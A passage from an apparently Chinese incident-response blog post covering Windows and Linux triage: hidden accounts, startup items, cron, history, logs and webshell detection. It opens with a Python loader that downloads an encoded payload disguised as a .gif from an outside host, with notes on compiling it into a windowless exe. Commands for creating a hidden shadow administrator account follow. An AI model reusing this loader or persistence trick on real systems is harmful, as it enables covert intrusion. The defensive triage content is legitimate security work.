k3/C+efkTYix9nJV7Jpx4Ttg3zg4U3P1C3a1fqaR1Lap5AIVOZu/L1+QGU3aAH+0R3677L3Ihs1peR/cYQyazP613aDYlHJc6Ky4lViwbFcgLE6zsson+IYOMz9YZ0mSiLyAbp3qxMBQgLeo/fhA+5M5fcwEatUOGfus/eitDIeakkcNufLrdXaPw04gQfJ7Gre2OAcR7wXkOhHwAV6Xg0IHOHJvPWRA/KjowQEJ8xMsAMnsKkwuPrWlaYWmikNosgzZzZDx27czlIpX1UD5p0V9BrjQ9BZJQyPE18RcyDLsx0WmIKUnh0L2gGuwvnRPZGQwitwGUvwZ1JuPWqDqDxwfWLZ9eyVlhf457YehxZcv3vpJkTqNsRqwK3ofxslzkFfzKOGrzXsoBYZx2QkiHKffZXp7OhmlC+Ign/LIdd/eD1uuaUDk00i8Ti0wmF2l0ITMLQoMWwxeIOTKlY0uP1YZvFd4XPjgUqIBRU3ENfmnihuv/drwvJ92xI1/T7JYKhpvKq85sTYg4aBG0yGaE1JaviiWKrFajihuMfr+CjzMVeNmjHLOS22AlfBkRRNFGIqWzqTP//tTQu+9OoT5KWG3+NxHXIZoMKnRczmVkvocVtF88aaowVQQdBGy1URnQdURuYqVI+m0anVW0MqpkkZAetm+KXMWj7/ybRULIc45B/tVr2rFpkrRa0QkmonAgbVA==&#x27;</span><br><span class=\"line\"># )))))</span><br><span class=\"line\"># &quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># res = base64.b64decode(AES.new(b&#x27;ysIx0oKueJV15dkA4P3WvDjnq9giB62=&#x27;, AES.MODE_CBC, b&#x27;jbMNXRf954m0WUzQ&#x27;).decrypt(base64.b64decode((b&#x27;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&#x27;</span><br><span class=\"line\"># ))))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">#</span><br><span class=\"line\"># class A(object):</span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (exec, (pick,))</span><br><span class=\"line\"># ret = json.dumps(A())</span><br><span class=\"line\"># print(ret)</span><br><span class=\"line\"># res = base64.b64encode(ret)</span><br><span class=\"line\"># print(res)</span><br><span class=\"line\">html=urllib.request.urlopen(&#x27;http://i.miaosu.bid/data/f_41570228.gif&#x27;).read()[7:]</span><br><span class=\"line\">html = html.strip(b&#x27;\\r\\n&#x27;)</span><br><span class=\"line\">res = html[:-3][::-1]+html[-3:]</span><br><span class=\"line\"># print(base64.b64decode(res))</span><br><span class=\"line\">json.loads(base64.b64decode(res))</span><br></pre></td></tr></table></figure>\n<p>在通过 pyinstaller 无窗口编译成为 exe</p>\n<h4 id=\"账户\"><a class=\"markdownIt-Anchor\" href=\"#账户\">#</a> 账户</h4>\n<blockquote>\n<p>首选管理员账户登录，不建议创建账户</p>\n<p>通过 net use 或者 computer mananger 查看用户</p>\n<p>net user haha$ shabi /add      //$ 结尾的用户为影子用户</p>\n<p>net localgroup adminstrators haha$ /add     // 加到管理员组</p>\n<p>此时 net user 看不到，但 computer manager 能看到</p>\n<p>或者通过注册表注册</p>\n<p>先把影子账户和正常账户导出</p>\n<p>通过修改账户的 F 键为想要克隆的键</p>\n<p>导入注册表</p>\n<p>具体自己查吧…</p>\n<p>控制面板和 net user 看不到，但注册表还是可以看到的</p>\n<p>因此在应急响应时查账户要查三个地方</p>\n<p>注册表，控制面板，net user</p>\n<p>或者使用 D 盾</p>\n<p>或者查看日志 eventvwr.msc</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105174751675.png\" alt=\"image-20221105174751675\" style=\"zoom:80%;\" />\n<p>Windows logs -&gt; security</p>\n<p>4624 4625</p>\n</blockquote>\n<h4 id=\"启动项任务计划服务\"><a class=\"markdownIt-Anchor\" href=\"#启动项任务计划服务\">#</a> 启动项，任务计划，服务</h4>\n<blockquote>\n<p>工具可以排查服务和启动项</p>\n<p>任务计划 task scheduler</p>\n<p>注册表启动项</p>\n<p>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<br>\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce</p>\n<p>组策略 gpedit.msc 中 自启</p>\n<p>Windows 设置 -&gt; 脚本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108124205969.png\" alt=\"image-20221108124205969\"></p>\n</blockquote>\n<p>总结:<br>\n 用户 -&gt; 端口 -&gt; 进程 -&gt; 注册表 -&gt; 启动项 -&gt; 任务计划 -&gt; 服务 -&gt; 组策略</p>\n<h3 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h3>\n<h4 id=\"账户-2\"><a class=\"markdownIt-Anchor\" href=\"#账户-2\">#</a> 账户</h4>\n<p>1.passwd</p>\n<p>awk -F:  ‘{print $1,<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>3</mn><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">3,</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8388800000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span></span></span></span>NF}’  | grep -Ev ‘nologin’</p>\n<p>排查 uid 和 gid , 和 bash</p>\n<p>2.shadow</p>\n<p>shadow 中第二列为！代表不能登录</p>\n<p>能正常登录的用户在第二列会有加密的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\">2、查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class=\"line\">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4、禁用或删除多余及可疑的帐号</span><br><span class=\"line\">    usermod -L user    禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class=\"line\">\tuserdel user       删除 user 用户</span><br><span class=\"line\">\tuserdel -r user    将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br></pre></td></tr></table></figure>\n<p>sudoers 中的内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Allow root to run any commands anywhere </span><br><span class=\"line\">root    ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows members of the &#x27;sys&#x27; group to run networking, software, </span><br><span class=\"line\">## service management apps and more.</span><br><span class=\"line\"># %sys ALL = NETWORKING, SOFTWARE, SERVICES, STORAGE, DELEGATING, PROCESSES, LOCATE, DRIVERS</span><br><span class=\"line\"></span><br><span class=\"line\">## Allows people in group wheel to run all commands</span><br><span class=\"line\">%wheel  ALL=(ALL)       ALL</span><br><span class=\"line\"></span><br><span class=\"line\">## Same thing without a password</span><br><span class=\"line\"># %wheel        ALL=(ALL)       NOPASSWD: ALL</span><br></pre></td></tr></table></figure>\n<p>因此可能存在 sudo 提权</p>\n<h4 id=\"历史命名\"><a class=\"markdownIt-Anchor\" href=\"#历史命名\">#</a> 历史命名</h4>\n<p>可以查看不同用户的历史命令 ～/.bash_history</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、root 用户的历史命令</span><br><span class=\"line\">histroy</span><br><span class=\"line\">2、打开 /home 各帐号目录下的 .bash_history，查看普通帐号执行的历史命令。</span><br><span class=\"line\">为历史的命令增加登录的 IP 地址、执行命令时间等信息：</span><br><span class=\"line\">1）保存1万条命令</span><br><span class=\"line\">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br><span class=\"line\">2）在/etc/profile的文件尾部添加如下行数配置信息：</span><br><span class=\"line\">######jiagu history xianshi#########</span><br><span class=\"line\">USER_IP=`who -u am i 2&gt;/dev/null | awk &#x27;&#123;print $NF&#125;&#x27; | sed -e &#x27;s/[()]//g&#x27;`</span><br><span class=\"line\">if [ &quot;$USER_IP&quot; = &quot;&quot; ]</span><br><span class=\"line\">then</span><br><span class=\"line\">USER_IP=`hostname`</span><br><span class=\"line\">fi</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%F %T $USER_IP `whoami` &quot;</span><br><span class=\"line\">shopt -s histappend</span><br><span class=\"line\">export PROMPT_COMMAND=&quot;history -a&quot;</span><br><span class=\"line\">######### jiagu history xianshi ##########</span><br><span class=\"line\">3）source /etc/profile 让配置生效</span><br><span class=\"line\">生成效果： 1  2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</span><br><span class=\"line\">3、历史操作命令的清除：history -c</span><br><span class=\"line\">但此命令并不会清除保存在文件中的记录，因此需要手动删除 .bash_profile 文件中的记录。</span><br></pre></td></tr></table></figure>\n<h4 id=\"端口-2\"><a class=\"markdownIt-Anchor\" href=\"#端口-2\">#</a> 端口</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netstat -lntup | more</span><br><span class=\"line\">查看下 pid 所对应的进程文件路径，</span><br><span class=\"line\">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）</span><br><span class=\"line\">如果要排查对应的pid的执行文件</span><br><span class=\"line\">在/proc/$pid/exe</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos 6852]# pwd</span><br><span class=\"line\">/proc/6852</span><br><span class=\"line\">[root@VM-16-11-centos 6852]# ls -al</span><br><span class=\"line\">dr-xr-xr-x   9 lighthouse lighthouse 0 Sep 11 14:30 .</span><br><span class=\"line\">dr-xr-xr-x 163 root       root       0 Mar 22  2022 ..</span><br><span class=\"line\">dr-xr-xr-x   2 lighthouse lighthouse 0 Nov  8 17:00 attr</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 cwd -&gt; /www/wwwroot/www.radsm.co/beef_1/beef</span><br><span class=\"line\">-r--------   1 lighthouse lighthouse 0 Nov  8 17:01 environ</span><br><span class=\"line\">lrwxrwxrwx   1 lighthouse lighthouse 0 Nov  8 17:01 exe -&gt; /home/lighthouse/.rvm/rubies/ruby-3.0.3/bin/ruby</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"进程-2\"><a class=\"markdownIt-Anchor\" href=\"#进程-2\">#</a> 进程</h4>\n<blockquote>\n<p>ps aux | ps ef</p>\n</blockquote>\n<h4 id=\"启动项\"><a class=\"markdownIt-Anchor\" href=\"#启动项\">#</a> 启动项</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/rc.local</span><br></pre></td></tr></table></figure>\n<h4 id=\"任务计划\"><a class=\"markdownIt-Anchor\" href=\"#任务计划\">#</a> 任务计划</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab -l   列出某个用户cron服务的详细内容</span><br><span class=\"line\"></span><br><span class=\"line\">重点关注以下目录中是否存在恶意脚本</span><br><span class=\"line\">/var/spool/cron/* </span><br><span class=\"line\">/etc/crontab</span><br><span class=\"line\">/etc/cron.d/*</span><br><span class=\"line\">/etc/cron.daily/* </span><br><span class=\"line\">/etc/cron.hourly/* </span><br><span class=\"line\">/etc/cron.monthly/*</span><br><span class=\"line\">/etc/cron.weekly/</span><br><span class=\"line\">/etc/anacrontab</span><br><span class=\"line\">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>\n<h4 id=\"日志\"><a class=\"markdownIt-Anchor\" href=\"#日志\">#</a> 日志</h4>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class=\"line\">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">定位有哪些IP在爆破：</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class=\"line\"></span><br><span class=\"line\">爆破用户名字典是什么？</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure| awk &#x27;&#123;print $9&#125;&#x27; | sort -nr | uniq -c</span><br><span class=\"line\"> </span><br><span class=\"line\">2、登录成功的IP有哪些： \t</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">登录成功的日期、用户名、IP：</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class=\"line\"></span><br><span class=\"line\">3、增加一个用户kali日志：</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class=\"line\">, shell=/bin/bash</span><br><span class=\"line\">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class=\"line\">#grep &quot;useradd&quot; /var/log/secure </span><br><span class=\"line\"></span><br><span class=\"line\">4、删除用户kali日志：</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\"># grep &quot;userdel&quot; /var/log/secure</span><br><span class=\"line\"></span><br><span class=\"line\">5、su切换用户：</span><br><span class=\"line\">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class=\"line\"></span><br><span class=\"line\">sudo授权执行:</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108174528702.png\" alt=\"image-20221108174528702\"></p>\n<p>账户 历史命令 端口 进程 开机启动 任务计划 日志</p>\n<h3 id=\"webshell-查杀\"><a class=\"markdownIt-Anchor\" href=\"#webshell-查杀\">#</a> webshell 查杀</h3>\n<h4 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>1.D 盾</p>\n<p>2. 河马</p>\n<p>3. 百度 webdir</p>\n<p>4. 在线 webshell 查杀 bugscanner</p>\n<h4 id=\"发现webshell后门\"><a class=\"markdownIt-Anchor\" href=\"#发现webshell后门\">#</a> 发现 webshell 后门</h4>\n<p>1. 判断 hash</p>\n<p>2.diff</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -c -a -r cms1 cms2</span><br><span class=\"line\">md5sum比较两个文件夹下面文件是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">Copy文件夹之后，检测两个文件夹（dir1，dir2）下文件是否相同。logdir 是任何一个存放生成文件的目录</span><br><span class=\"line\">cd dir1</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\"></span><br><span class=\"line\">cd dir2</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\">cd logdir</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">diff result.txt result.txt</span><br></pre></td></tr></table></figure>\n<p>3. 工具</p>\n<p>winMerge</p>\n<p>beyond compare</p>\n<h2 id=\"日志分析\"><a class=\"markdownIt-Anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<h3 id=\"windows日志分析\"><a class=\"markdownIt-Anchor\" href=\"#windows日志分析\">#</a> Windows 日志分析</h3>\n<p>Windows 系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n<blockquote>\n<p>系统日志</p>\n<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。</p>\n<p>默认位置： % SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</p>\n<p>应用程序日志</p>\n<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</p>\n<p>安全日志</p>\n<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</p>\n</blockquote>\n<p><strong>开启审核策略</strong></p>\n<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109145256851.png\" alt=\"image-20221109145256851\"></p>\n<p><strong>设置日志属性</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192149696.png\" alt=\"image-20221109192149696\"></p>\n<h4 id=\"日志分析-2\"><a class=\"markdownIt-Anchor\" href=\"#日志分析-2\">#</a> 日志分析</h4>\n<p>对于 Windows 事件日志分析，不同的 EVENT ID 代表了不同的意义，摘录一些常见的安全事件的说明：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109144436445.png\" alt=\"image-20221109144436445\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109153134531.png\" alt=\"image-20221109153134531\"></p>\n<p>4634,4647 远程登录注销时触发</p>\n<h4 id=\"工具分析\"><a class=\"markdownIt-Anchor\" href=\"#工具分析\">#</a> 工具分析：</h4>\n<p><strong>Log Parser</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录成功的所有事件</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">指定登录时间范围的事件：</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提取登录成功的用户名和IP：</span><br><span class=\"line\">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>LogParser Lizard</strong></p>\n<p><strong>Event Log Explorer</strong></p>\n<h3 id=\"linux-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#linux-日志分析\">#</a> linux 日志分析</h3>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192416867.png\" alt=\"image-20221109192416867\"></p>\n<p>比较重要的几个日志：<br>\n登录失败记录：/var/log/btmp     //lastb</p>\n<p>​\t最后一次登录：/var/log/lastlog  //lastlog</p>\n<p>​\t登录成功记录: /var/log/wtmp     //last</p>\n<p>​\t登录日志记录：/var/log/secure</p>\n<p>​\t目前登录用户信息：/var/run/utmp  //w、who、users</p>\n<p>​\t历史命令记录：history</p>\n<p>​\t仅清理当前用户： history -c</p>\n<p>日志分析 find grep egrep awk sed</p>\n<h3 id=\"web-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#web-日志分析\">#</a> web 日志分析</h3>\n<p>Apache 日志分析技巧：</p>\n<p>Web 访问日志记录了 Web 